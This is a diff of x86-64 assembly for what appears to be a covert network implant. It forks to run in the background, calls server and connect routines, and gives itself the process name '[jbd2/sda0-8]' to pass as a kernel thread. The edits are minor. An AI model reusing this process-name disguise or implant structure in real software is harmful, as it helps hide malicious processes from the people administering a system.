@@ -5,7 +5,7 @@ section .data
         tv_sec  dd 0
         tv_usec dd 0
 
-section .rodata:
+section .rodata
     pname: db "[jbd2/sda0-8]", 0
 
 section .text
@@ -13,16 +13,6 @@ section .text
     global sleep
     extern create_server
     extern loop_server
-
-sleep:
-    mov     eax, edi
-    mov     DWORD [tv_sec], eax
-    mov     DWORD [tv_usec], 0
-    mov     rax, 0x23
-    mov     rdi, timeval
-    mov     rsi, 0
-    syscall
-    ret
 
 strcpy:
     mov     al, [rsi]
@@ -54,7 +44,8 @@ _start:
     ; cmp     rax, 0
     ; jne     exit
     call    create_server
-    mov     rax, 0x39
+; don't fork when it crashes :)
+    mov     rax, 0x39 ; fork
     syscall
     cmp     rax, 0
     jne     fork2
@@ -62,7 +53,7 @@ _start:
     mov     BYTE [rax + 0xb], 54
     jmp     connect
 fork2:
-    mov     rax, 0x39
+    mov     rax, 0x39 ; fork
     syscall
     cmp     rax, 0
     jne     connect
@@ -73,6 +64,6 @@ connect:
 
 exit:
     mov     rdi, 0
-    mov     rax, 0x3c
+    mov     rax, 0x3c ; exit
     syscall
     ret 
